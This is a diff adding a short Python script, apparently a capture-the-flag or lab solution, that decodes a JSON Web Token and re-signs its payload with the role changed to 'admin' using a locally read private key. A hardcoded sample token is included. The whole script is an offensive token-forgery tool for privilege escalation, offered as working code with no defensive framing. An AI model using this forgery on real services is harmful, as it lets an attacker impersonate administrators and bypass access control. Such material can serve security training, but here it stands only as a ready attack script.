@@ -1,0 +1,28 @@
+import jwt
+import json
+import base64
+from datetime import datetime, timedelta
+
+def inspect_token(token):
+    token_info = token.split('.')
+    header = json.loads(base64.b64decode(token_info[0]).decode('UTF-8'))
+    payload = json.loads(base64.b64decode(token_info[1] + '==').decode('UTF-8'))
+    print(header)
+    print(payload)
+    return payload
+
+def gen_forged_token(payload):
+    private_key = open("private-key.pem", "r").read()
+    payload['role'] = 'admin'
+    return jwt.encode(
+        payload,
+        private_key,
+        'RS256'
+    )
+    
+
+if __name__ == "__main__":
+    token = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpZCI6MSwiZXhwIjoxNjQxNTc0NzI4LCJyb2xlIjoiZGVmYXVsdCIsInBrIjoiLS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS1cbk1JSUNJakFOQmdrcWhraUc5dzBCQVFFRkFBT0NBZzhBTUlJQ0NnS0NBZ0VBcks3dmRuZU5HcUx6UlR5NTF5YlZcbmFTS3FaV3BsaERFYzRIVEJnM0pqTGU0VWQ1UVdWN3VWY1NrWk5YeTBjRUlHMjY0RlRGZGJDTXJ4ZXhBNjFxMjNcblRSTVFRbU5ENGxkamVMenl1WXNUb2tMOUpaM0o4WEFmL0Z3T1ArUys0TGl5M045emg2QUYveVM0bGVRanIvdHNcbmlMWXR3OFF2OEVVVEFIT2dRcE1kVTN5TFZsaExDNkhaME82Q2o1ZTR5SzZVZjM1YjNwU3FQU2RLUXZCSVJiVDZcbmdkSEQvOGgxM3NTNDg5a1N1NnJFaXM3VThPUGppVmdwcithdWs3TXJsODdibFg4WDIxWW1qVXpEclZjSHZqcTdcbmMyN2V0QmRrMTd2czN0R1NNcEt2LytwUnhkSGpLK3BxTDFYT2J5M2x1QjkzdElFdWZIalN0SXUvRWlBMjdtcHVcbkZZaDYyMTR3QnVEZ2liSFNwVlY1UkZha2xFTDV6aU92azNhSHV4bXhjRUgyM1VIeVExazNaZ2JGZml4blg1WHVcbnFpTlgzTnNtWFlabVpaR0tET3JXc2o5UDMyZmtVZjN2UGYwT2VVblVzZFB4bnFmckJqY2JtZHQ4c3FVWGNqaFZcbkpTRkF1Q0ZCamF6Y0J5MkRqZUZqY2JpL1RMUWxSODl4RkhtN3RPcnBlcittdHYrWWx2UFI2TWVDd3ljR0duT21cbnN0T3d6LzVId1BRM2tQVWE0OEJoK1lvUGlWUHNiMk9wV2Vtc2U5cU52RkdKcEVISDNiaERaNzNCbjYwVVBQNFpcbkR6SW83aGVrcktiRjBkbnBwS21xRVJGRGJVOGJoWHFMSlBkT2ZqM0F4SGt1WmtxV2JGcWg5dC8xM2VGUEZMTVhcbmFGMC9DZi9PTTRrWTduazh1TUUybUxrQ0F3RUFBUT09XG4tLS0tLUVORCBQVUJMSUMgS0VZLS0tLS1cbiJ9.XCbH_TO4WTRnPL8PSQW4Kad7dlpaYHjheiEKwNEU785-2hobdHhEYtS_qirZ9VW9LwRw_XZmHTve0vpfImNdCnQSZbIzz0BwzwOjrTLxvUBJiSBH57JxJEDE2Vfs0Jga7qb9SvQQvugotFgN1iQdQiDvZqQRwPs_42Q4q4-aj_UR3biJvtDYVbYkmjUzpYj207JiMeWdqipJU2Ag8YdX_gYc7zOH1QCu1GV0pxyU7SJDwG-txibQz84yxMP8yRpPKRzAI3G5nZzH4VaF-F6b2urVTbgY56HHz5I3qFnDqHNktY8JMfNPEHh75JScHnnQyWGAplTilyXMeNMr0UCnzTTyg24hiAbIJEGUzWeVg3nBhVfMzQjc9Jb_L8XS7vPovx5wBhhvddZyWKXz-MzFfb0FXYVbqtnpYemF_qLHDObMW1LVKDTrGE8fA2Bqqn2x3JrMT9Q61FxGmigjGykta0ZopzOr0nWNe7zbZMhz9YirjdAgc7NbKuVF3c03EEQKAneH4LaN8sqIW96A6wldbLO6177UXWhp95p7oaJJOlcspjCFImuQtcQxGOe9KE3SWfQIbP1E0cth8X4VXY3-iJMXbSKjoCSY8k1Zs8Mbzj_DD7XyLfF_x4X0oHycluppuaqqTvz_zqk8i1hksmfw0rLg9icCeMmo_o2-WIww-bc'
+    payload = inspect_token(token)
+    print('\n')
+    print(gen_forged_token(payload))
